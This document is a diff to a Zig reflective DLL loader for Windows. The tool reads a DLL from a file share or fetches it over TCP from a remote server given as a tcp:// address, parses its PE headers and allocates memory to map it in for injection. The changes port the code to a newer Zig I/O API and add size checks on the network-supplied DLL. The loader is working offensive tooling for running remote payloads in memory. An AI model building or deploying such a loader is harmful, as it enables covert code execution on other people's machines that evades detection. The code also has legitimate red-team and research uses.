@@ -9,12 +9,53 @@ const std = @import("std");
 const win32 = @import("win32").everything;
 const windows = std.os.windows;
 
-const DLLEntry = (*const fn (win32.HINSTANCE, u32, ?windows.LPVOID) callconv(.C) win32.BOOL);
+const DLLEntry = (*const fn (win32.HINSTANCE, u32, ?windows.LPVOID) callconv(.winapi) win32.BOOL);
 const INVALID_FILESIZE: u32 = 0xFFFFFFFF;
 
 const BASE_RELOCATION_ENTRY = packed struct(u16) {
     Offset: u12,
     Type: u4,
+};
+
+// upstream has alignment which fucks the struct with extra padding...
+const IMAGE_OPTIONAL_HEADER64 = extern struct {
+    Magic: win32.IMAGE_OPTIONAL_HEADER_MAGIC align(4),
+    MajorLinkerVersion: u8,
+    MinorLinkerVersion: u8,
+    SizeOfCode: u32 align(4),
+    SizeOfInitializedData: u32 align(4),
+    SizeOfUninitializedData: u32 align(4),
+    AddressOfEntryPoint: u32 align(4),
+    BaseOfCode: u32 align(4),
+    ImageBase: u64 align(4),
+    SectionAlignment: u32 align(4),
+    FileAlignment: u32 align(4),
+    MajorOperatingSystemVersion: u16,
+    MinorOperatingSystemVersion: u16,
+    MajorImageVersion: u16,
+    MinorImageVersion: u16,
+    MajorSubsystemVersion: u16,
+    MinorSubsystemVersion: u16,
+    Win32VersionValue: u32 align(4),
+    SizeOfImage: u32 align(4),
+    SizeOfHeaders: u32 align(4),
+    CheckSum: u32 align(4),
+    Subsystem: win32.IMAGE_SUBSYSTEM,
+    DllCharacteristics: win32.IMAGE_DLL_CHARACTERISTICS,
+    SizeOfStackReserve: u64 align(4),
+    SizeOfStackCommit: u64 align(4),
+    SizeOfHeapReserve: u64 align(4),
+    SizeOfHeapCommit: u64 align(4),
+    /// Deprecated
+    LoaderFlags: u32 align(4),
+    NumberOfRvaAndSizes: u32 align(4),
+    DataDirectory: [16]win32.IMAGE_DATA_DIRECTORY,
+};
+
+const IMAGE_NT_HEADERS64 = extern struct {
+    Signature: u32,
+    FileHeader: win32.IMAGE_FILE_HEADER,
+    OptionalHeader: IMAGE_OPTIONAL_HEADER64,
 };
 
 const IMAGE_ORDINAL_FLAG64: usize = 0x8000000000000000;
@@ -34,19 +75,21 @@ const Action = struct {
         UnknownError,
     };
 
-    allocator: std.mem.Allocator,
     dll: [:0]u8,
     file_type: FILE_TYPE,
     ip: []u8,
     port: u16,
+    allocator: std.mem.Allocator,
+    io: std.Io,
 
-    pub fn init(allocator: std.mem.Allocator) !Self {
+    pub fn init(allocator: std.mem.Allocator, io: std.Io) !Self {
         return Self{
-            .allocator = allocator,
             .dll = undefined,
             .file_type = undefined,
             .ip = undefined,
             .port = 0,
+            .allocator = allocator,
+            .io = io,
         };
     }
 
@@ -54,7 +97,7 @@ const Action = struct {
 
     pub fn reflect(self: *Self) !i32 {
         std.log.debug("[+] reflect called", .{});
-        var dllBytes: ?*anyopaque = null;
+        var dllBytes: []u8 = undefined;
         var dllSize: u32 = 0;
 
         // get this module's image base address
@@ -70,84 +113,82 @@ const Action = struct {
         switch (self.file_type) {
             .SHARE => {
                 std.log.debug("Reading file {s}", .{self.dll});
-                // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea
-                const dll = win32.CreateFileA(self.dll, win32.FILE_GENERIC_READ, win32.FILE_SHARE_NONE, null, win32.OPEN_EXISTING, win32.FILE_ATTRIBUTE_READONLY, null);
-                if (dll == win32.INVALID_HANDLE_VALUE) {
-                    std.log.err("[-] Failed CreateFileA({s}) :: {d}", .{ self.dll, @intFromEnum(win32.GetLastError()) });
-                    return Error.UnknownError;
-                }
-                defer utility.closeHandle(dll);
 
-                // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-getfilesize
-                dllSize = win32.GetFileSize(dll, null);
-                if (dllSize == INVALID_FILESIZE) {
-                    std.log.err("[-] Failed CreateFileA({s}) :: {d}", .{ self.dll, @intFromEnum(win32.GetLastError()) });
-                    return Error.UnknownError;
-                }
+                const dir = std.Io.Dir.cwd();
+                dllBytes = try dir.readFileAlloc(
+                    self.io,
+                    self.dll,
+                    self.allocator,
+                    .unlimited,
+                );
+                // defer self.allocator.free(dllBytes);
+                std.debug.print("{d} bytes", .{dllBytes.len});
 
-                // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-getprocessheap
-                const hHeap = win32.GetProcessHeap();
-                if (hHeap == null) {
-                    std.log.err("[-] Failed GetProcessHeap() :: {d}", .{@intFromEnum(win32.GetLastError())});
-                    return Error.UnknownError;
-                }
+                dllSize = @intCast(dllBytes.len);
 
-                // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc
-                dllBytes = win32.HeapAlloc(hHeap, win32.HEAP_ZERO_MEMORY, dllSize);
-                if (dllBytes == null) {
-                    std.log.err("[-] Failed HeapAlloc(0x{x}) :: {d}", .{ dllSize, @intFromEnum(win32.GetLastError()) });
-                    return Error.UnknownError;
-                }
-                // https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapfree
-                defer _ = win32.HeapFree(hHeap, win32.HEAP_ZERO_MEMORY, dllBytes);
-
-                var outSize: u32 = 0;
-                // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile
-                const retval = win32.ReadFile(dll, dllBytes, dllSize, &outSize, null);
-
-                if (outSize != dllSize or retval == 0) {
-                    std.log.err("[-] Failed ReadFile({s}, {d}) :: {d}", .{ self.dll, dllSize, @intFromEnum(win32.GetLastError()) });
-                    return Error.UnknownError;
-                }
+                std.log.debug("dllSize: 0x{x}", .{dllSize});
             },
             .TCP => {
                 std.log.debug("Connecting to server {s}:{d}", .{ self.ip, self.port });
-                const stream = try std.net.tcpConnectToHost(self.allocator, self.ip, self.port);
-                var buffer: [8]u8 = std.mem.zeroes([8]u8);
+                const addr = try std.Io.net.IpAddress.parse(self.ip, self.port);
+                const stream = try addr.connect(self.io, .{
+                    .mode = .stream,
+                });
+                defer stream.close(self.io);
 
-                std.log.debug("Reading size ", .{});
+                // Backing buffer for the reader (must be >= largest single read)
+                var read_buf: [4096]u8 = undefined;
+                var stream_reader = stream.reader(self.io, &read_buf);
+                const reader: *std.Io.Reader = &stream_reader.interface;
 
-                if (@sizeOf(u32) != try stream.readAtLeast(&buffer, @sizeOf(u32))) {
+                // Read u32 size prefix
+                std.log.debug("Reading size", .{});
+                reader.fill(@sizeOf(u32)) catch {
                     std.log.err("[-] Failed to read DLL size", .{});
                     return Error.UnknownError;
-                }
+                };
+                dllSize = try reader.takeInt(u32, .big);
 
-                dllSize = std.mem.readInt(u32, buffer[0..@sizeOf(u32)], std.builtin.Endian.big);
+                std.log.debug("Read size: {d}", .{dllSize});
 
-                std.log.debug("Read size : {d}", .{dllSize});
+                // Sanity check before trusting the network-supplied size
+                const MAX_DLL_SIZE: u32 = 64 * 1024 * 1024; // 64 MB
+                const MIN_DLL_SIZE: u32 = 64; // a valid PE is never this small...right?
 
-                const dll = try self.allocator.alloc(u8, dllSize);
-
-                if (dllSize != try stream.readAll(dll)) {
-                    std.log.err("[-] Failed to read DLL", .{});
+                if (dllSize < MIN_DLL_SIZE or dllSize > MAX_DLL_SIZE) {
+                    std.log.err("[-] DLL size {d} out of acceptable range [{d}, {d}]", .{
+                        dllSize, MIN_DLL_SIZE, MAX_DLL_SIZE,
+                    });
                     return Error.UnknownError;
                 }
 
-                dllBytes = dll.ptr;
+                const dll = self.allocator.alloc(u8, dllSize) catch |err| {
+                    std.log.err("[-] Failed to allocate {d} bytes for DLL: {}", .{ dllSize, err });
+                    return Error.UnknownError;
+                };
+                errdefer self.allocator.free(dll); // clean up if the read below fails
 
-                stream.close();
+                try reader.readSliceAll(dll);
+
+                dllBytes = dll;
             },
         }
 
+        std.log.info("start...", .{});
+
         // get pointers to in-memory DLL headers
-        const dllBytesAddr = @intFromPtr(dllBytes);
-        const base: usize = @intFromPtr(dllBytes.?);
-        const DOSHeader = @as(*const win32.IMAGE_DOS_HEADER, @ptrFromInt(base)).*;
-        const NTHeaderOffset: u32 = @intCast(DOSHeader.e_lfanew);
-        const offset: usize = base + NTHeaderOffset;
-        const NTHeader = @as(*const win32.IMAGE_NT_HEADERS64, @ptrFromInt(offset)).*;
+        const dllBytesAddr = @intFromPtr(dllBytes.ptr);
+        const base: usize = @intFromPtr(dllBytes.ptr);
+        const DOSHeader = @as(*const win32.IMAGE_DOS_HEADER, @ptrCast(@alignCast(dllBytes.ptr)));
+        std.log.debug("DOSHeader.e_lfanew: 0x{x}", .{DOSHeader.*.e_lfanew});
+        const NTHeaderOffset: u32 = @intCast(DOSHeader.*.e_lfanew);
+        const offset: usize = @intFromPtr(DOSHeader) + NTHeaderOffset;
+        std.log.debug("offset: 0x{x}", .{offset - base});
+        const NTHeader = @as(*const IMAGE_NT_HEADERS64, @ptrFromInt(offset)).*;
         const DLLImageBase: usize = NTHeader.OptionalHeader.ImageBase;
         const DLLImageSize: usize = NTHeader.OptionalHeader.SizeOfImage;
+
+        std.log.debug("SizeOfCode :: 0x{x}\n", .{NTHeader.OptionalHeader.SizeOfCode});
 
         std.log.debug("base :: 0x{x}", .{base});
         std.log.debug("NTHeaderOffset :: 0x{x}", .{NTHeaderOffset});
@@ -155,8 +196,9 @@ const Action = struct {
         std.log.debug("NTHeader.SizeOfImage 0x{x} // 0x{x}", .{ DLLImageSize, dllSize });
         std.log.debug("NTHeader.SizeOfOptionalHeader 0x{x}", .{NTHeader.FileHeader.SizeOfOptionalHeader});
 
-        const rawBytes: []const u8 = @as([*]u8, @ptrCast(dllBytes))[0..dllSize];
-        // std.log.debug("NTHeader DLLImageSize :: 0x{x} // 0x", .{rawBytes[0x78..0x7C]});
+        const rawBytes: []const u8 = @as([*]u8, @ptrCast(@alignCast(dllBytes.ptr)))[0..dllSize];
+        std.log.debug("PE Magic :: 0x{x}", .{rawBytes[0x0..0x4]});
+        std.log.debug("NTHeader SizeOfImage :: 0x{x}", .{rawBytes[0x78..0x7C]});
 
         // allocate new memory space for the DLL. Try to allocate memory in the image's preferred base address, but don't stress if the memory is allocated elsewhere
         // https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
@@ -354,7 +396,7 @@ const Action = struct {
         std.log.info("\nAttempt to inject {s}\n", .{self.dll});
     }
 
-    pub fn parseDLL(self: *Self, line: []u8) !void {
+    pub fn parseDLL(self: *Self, line: [:0]const u8) !void {
         self.file_type = FILE_TYPE.SHARE;
 
         if (std.mem.startsWith(u8, line, "tcp://")) {
@@ -383,10 +425,12 @@ const Action = struct {
     }
 };
 
-pub fn usage(argv: []u8) !void {
-    const stdout = std.io.getStdOut().writer();
-
-    try stdout.print(
+pub fn usage(
+    allocator: std.mem.Allocator,
+    io: std.Io,
+    argv: [:0]const u8,
+) !void {
+    const buffer: []u8 = try std.fmt.allocPrint(allocator,
         \\
         \\Example:
         \\
@@ -399,23 +443,23 @@ pub fn usage(argv: []u8) !void {
         \\
     , .{ argv, argv, argv });
 
-    std.posix.exit(0);
+    try std.Io.File.stdout().writeStreamingAll(io, buffer);
+
+    std.process.exit(0);
 }
 
-pub fn main() !void {
-    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
+pub fn main(init: std.process.Init) !void {
+    var gpa = std.heap.DebugAllocator(.{}){};
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
 
-    // Parse args into string array (error union needs 'try')
-    const args = try std.process.argsAlloc(allocator);
-    defer std.process.argsFree(allocator, args);
+    const args = try init.minimal.args.toSlice(init.arena.allocator());
 
     if (args.len < 2) {
-        try usage(args[0]);
+        try usage(allocator, init.io, args[0]);
     }
 
-    var action = try Action.init(allocator);
+    var action = try Action.init(allocator, init.io);
     defer action.deinit();
 
     var i: u8 = 0;
